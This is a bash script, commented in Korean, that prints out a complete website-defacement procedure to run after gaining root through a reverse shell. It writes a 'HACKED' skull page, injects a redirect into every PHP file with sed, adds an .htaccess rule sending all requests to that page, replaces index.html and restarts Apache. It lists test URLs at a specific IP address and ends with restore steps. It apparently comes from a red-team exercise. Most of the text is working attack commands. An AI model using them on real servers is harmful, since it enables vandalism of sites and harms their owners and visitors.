#!/bin/bash
echo "============================================================"
echo "👑 ROOT 권한 획득 후 전체 사이트 장악"
echo "============================================================"
echo ""
echo "리버스 쉘에서 root 권한 획득 후 실행:"
echo ""

echo "단계 1: hacked.html 생성"
echo "------------------------------------------------------------"
cat << 'HTMLEOF'
cat > /var/www/html/hacked.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>HACKED</title>
<style>
*{margin:0;padding:0}
body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}
.skull{font-size:12px;line-height:1.2;white-space:pre}
h1{font-size:3em;color:#f00;animation:b .5s infinite}
@keyframes b{0%,100%{opacity:1}50%{opacity:.3}}
</style>
</head>
<body>
<div>
<div class="skull">    _.--""-._
 ."         ".
/             \
|,  .-.  .-.  ,|
| )(__/  \__)( |
|/     /\     \|
(_     ^^     _)
 \____________/</div>
<h1>HACKED</h1>
<p style="margin:20px 0">SYSTEM COMPROMISED</p>
<p>[SQL Injection: BYPASSED]<br>
[File Upload: EXPLOITED]<br>
[XSS: INJECTED]<br>
[CSRF: EXECUTED]<br>
[Database: COMPROMISED]</p>
<p style="margin-top:20px">-- Red Team --</p>
</div>
</body>
</html>
EOF
HTMLEOF

echo ""
echo "단계 2: 모든 PHP 파일 백업"
echo "------------------------------------------------------------"
cat << 'BACKUPEOF'
mkdir -p /var/www/html/.backup
find /var/www/html -maxdepth 1 -name "*.php" -type f -exec cp {} /var/www/html/.backup/ \;
echo "[+] 백업 완료: /var/www/html/.backup/"
BACKUPEOF

echo ""
echo "단계 3: 모든 PHP 파일 상단에 리다이렉트 코드 주입"
echo "------------------------------------------------------------"
cat << 'INJECTEOF'
for file in /var/www/html/*.php; do
    # 원본 백업
    cp "$file" "$file.bak"

    # PHP 태그 다음에 리다이렉트 코드 삽입
    sed -i '1a\
<?php header("Location: /hacked.html"); exit; ?>' "$file"

    echo "[+] Injected: $file"
done
INJECTEOF

echo ""
echo "단계 4: .htaccess 생성 (이중 방어)"
echo "------------------------------------------------------------"
cat << 'HTACCESSEOF'
cat > /var/www/html/.htaccess << 'EOF'
# 모든 요청을 hacked.html로 리다이렉트
RewriteEngine On
RewriteCond %{REQUEST_URI} !^/hacked\.html$
RewriteCond %{REQUEST_URI} !^/uploads/
RewriteRule ^(.*)$ /hacked.html [L,R=302]
EOF
echo "[+] .htaccess 생성 완료"
HTACCESSEOF

echo ""
echo "단계 5: index.html도 교체 (혹시 몰라)"
echo "------------------------------------------------------------"
cat << 'INDEXEOF'
if [ -f /var/www/html/index.html ]; then
    cp /var/www/html/index.html /var/www/html/index.html.bak
    cp /var/www/html/hacked.html /var/www/html/index.html
    echo "[+] index.html 교체 완료"
fi
INDEXEOF

echo ""
echo "단계 6: Apache 재시작 (변경사항 적용)"
echo "------------------------------------------------------------"
cat << 'RESTARTEOF'
systemctl restart apache2
# 또는
service apache2 restart
echo "[+] Apache 재시작 완료"
RESTARTEOF

echo ""
echo "============================================================"
echo "✅ 완료!"
echo "============================================================"
echo ""
echo "테스트:"
echo "  http://52.78.221.104/"
echo "  http://52.78.221.104/login.php"
echo "  http://52.78.221.104/profile.php"
echo "  http://52.78.221.104/file.php"
echo ""
echo "→ 모든 URL에서 해골 화면!"
echo ""
echo "============================================================"
echo "복구 방법:"
echo "============================================================"
echo ""
cat << 'RESTOREEOF'
# 1. .htaccess 삭제
rm /var/www/html/.htaccess

# 2. PHP 파일 복구
for file in /var/www/html/*.php.bak; do
    original="${file%.bak}"
    mv "$file" "$original"
    echo "[+] 복구: $original"
done

# 3. hacked.html 삭제
rm /var/www/html/hacked.html

# 4. index.html 복구 (있을 경우)
if [ -f /var/www/html/index.html.bak ]; then
    mv /var/www/html/index.html.bak /var/www/html/index.html
fi

# 5. Apache 재시작
systemctl restart apache2

echo "[+] 복구 완료"
RESTOREEOF

echo ""
echo "============================================================"
